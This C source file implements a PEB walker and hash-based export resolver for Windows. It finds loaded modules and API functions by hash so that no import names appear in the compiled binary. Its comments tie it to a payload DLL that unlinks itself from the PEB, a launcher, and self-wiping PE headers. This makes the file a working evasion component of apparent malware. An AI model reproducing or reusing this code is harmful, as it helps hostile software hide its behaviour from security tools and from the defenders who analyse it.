/* ================================================================== *
 * lazy_api.c — PEB-walker + export-table hash resolver.               *
 *                                                                    *
 * See lazy_api.h for design + threat model.                          *
 *                                                                    *
 * All hot functions are inlined into the caller by /O2 /GL so the    *
 * only bytes that end up in the shipped binary are the export-table  *
 * walk logic — no import name strings anywhere.                       *
 * ================================================================== */

#include "lazy_api.h"

/* ─── PEB layout (subset we need) ─────────────────────────────────
 *
 * These are the SAME structs used in payload/src/dllmain.c for PEB
 * unlink, but declared here again so lazy_api.c can be included by
 * launcher (which doesn't have the payload's dllmain.c PEB defs). */

typedef struct _LAZY_LIST_ENTRY {
    struct _LAZY_LIST_ENTRY *Flink, *Blink;
} LAZY_LIST_ENTRY;

typedef struct _LAZY_UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} LAZY_UNICODE_STRING;

typedef struct _LAZY_LDR_ENTRY {
    LAZY_LIST_ENTRY InLoadOrderLinks;
    LAZY_LIST_ENTRY InMemoryOrderLinks;
    LAZY_LIST_ENTRY InInitOrderLinks;
    PVOID           DllBase;
    PVOID           EntryPoint;
    ULONG           SizeOfImage;
    LAZY_UNICODE_STRING FullDllName;
    LAZY_UNICODE_STRING BaseDllName;
} LAZY_LDR_ENTRY;

typedef struct _LAZY_PEB_LDR_DATA {
    ULONG            Length;
    ULONG            Initialized;
    PVOID            SsHandle;
    LAZY_LIST_ENTRY  InLoadOrderModuleList;
    LAZY_LIST_ENTRY  InMemoryOrderModuleList;
    LAZY_LIST_ENTRY  InInitOrderModuleList;
} LAZY_PEB_LDR_DATA;

typedef struct _LAZY_PEB {
    BYTE               Reserved1[2];
    BYTE               BeingDebugged;
    BYTE               Reserved2[1];
    PVOID              Reserved3[2];
    LAZY_PEB_LDR_DATA *Ldr;
} LAZY_PEB;

static LAZY_PEB *lazy_get_peb(void) {
#ifdef _WIN64
    return (LAZY_PEB *)__readgsqword(0x60);
#else
    return (LAZY_PEB *)__readfsdword(0x30);
#endif
}

/* Compare a UNICODE_STRING module name against a hash. Returns 1 on
 * match. Handles the trailing ".dll" that PEB entries include but our
 * callers may or may not — we try BOTH ways to be tolerant. */
static int lazy_module_matches(const LAZY_UNICODE_STRING *name, uint32_t target_hash) {
    /* PEB Buffer isn't null-terminated within the length field; make a
     * bounded local copy on the stack + null-terminate. */
    wchar_t buf[128];
    size_t chars = name->Length / sizeof(wchar_t);
    if (chars >= 128) chars = 127;
    for (size_t i = 0; i < chars; i++) buf[i] = name->Buffer[i];
    buf[chars] = 0;

    if (svc_hash_w(buf) == target_hash) return 1;

    /* Also try without the ".dll" suffix so callers can pass either
     * L"kernel32.dll" or L"kernel32". */
    if (chars >= 4 &&
        (buf[chars-4] == L'.') &&
        (buf[chars-3] == L'd' || buf[chars-3] == L'D') &&
        (buf[chars-2] == L'l' || buf[chars-2] == L'L') &&
        (buf[chars-1] == L'l' || buf[chars-1] == L'L')) {
        buf[chars-4] = 0;
        if (svc_hash_w(buf) == target_hash) return 1;
    }
    return 0;
}

void *lazy_get_module_by_hash(uint32_t module_name_hash_w) {
    LAZY_PEB *peb = lazy_get_peb();
    if (!peb || !peb->Ldr) return NULL;
    LAZY_LIST_ENTRY *head = &peb->Ldr->InLoadOrderModuleList;
    for (LAZY_LIST_ENTRY *cur = head->Flink; cur && cur != head; cur = cur->Flink) {
        LAZY_LDR_ENTRY *ent = (LAZY_LDR_ENTRY *)cur;
        if (!ent->DllBase) continue;
        if (lazy_module_matches(&ent->BaseDllName, module_name_hash_w)) {
            return ent->DllBase;
        }
    }
    return NULL;
}

void *lazy_get_proc_by_hash(void *module_base, uint32_t proc_name_hash) {
    if (!module_base) return NULL;
    BYTE *base = (BYTE *)module_base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    /* Some modules (or our own, post-wipe_pe_headers()) have their MZ
     * signature nulled. e_lfanew still points at NT headers in that
     * case — DOS stub's e_lfanew field lives at offset 0x3C and is
     * NOT wiped by our PE-header-wipe. */
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *exp_dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dd->VirtualAddress || !exp_dd->Size) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(base + exp_dd->VirtualAddress);
    DWORD  *name_rvas = (DWORD *)(base + exp->AddressOfNames);
    DWORD  *func_rvas = (DWORD *)(base + exp->AddressOfFunctions);
    WORD   *ord_tab   = (WORD  *)(base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + name_rvas[i]);
        if (svc_hash_a(name) != proc_name_hash) continue;
        WORD ord = ord_tab[i];
        if (ord >= exp->NumberOfFunctions) return NULL;
        DWORD fn_rva = func_rvas[ord];
        void *fn = base + fn_rva;

        /* Forwarded exports: fn_rva points inside the export directory
         * and the target is a string like "NTDLL.RtlSomeFunction".
         * Resolve by splitting on '.', hashing both halves, recursing. */
        if (fn_rva >= exp_dd->VirtualAddress &&
            fn_rva <  exp_dd->VirtualAddress + exp_dd->Size) {
            const char *fwd = (const char *)fn;
            /* Split on the LAST '.' — some forwards are "api-ms-win-...".RtlXxx" */
            char mod_name[64] = {0};
            const char *dot = NULL;
            for (const char *p = fwd; *p; p++) if (*p == '.') dot = p;
            if (!dot) return NULL;
            size_t mod_len = (size_t)(dot - fwd);
            if (mod_len >= 64) mod_len = 63;
            for (size_t k = 0; k < mod_len; k++) mod_name[k] = fwd[k];
            mod_name[mod_len] = 0;
            /* Convert narrow module name to wide for lazy_get_module_by_hash */
            wchar_t mod_wide[64];
            for (size_t k = 0; k <= mod_len; k++) mod_wide[k] = (wchar_t)mod_name[k];
            void *fwd_mod = lazy_get_module_by_hash(svc_hash_w(mod_wide));
            if (!fwd_mod) return NULL;
            return lazy_get_proc_by_hash(fwd_mod, svc_hash_a(dot + 1));
        }
        return fn;
    }
    return NULL;
}

void *lazy_resolve(uint32_t module_name_hash_w, uint32_t proc_name_hash) {
    void *mod = lazy_get_module_by_hash(module_name_hash_w);
    if (!mod) return NULL;
    return lazy_get_proc_by_hash(mod, proc_name_hash);
}
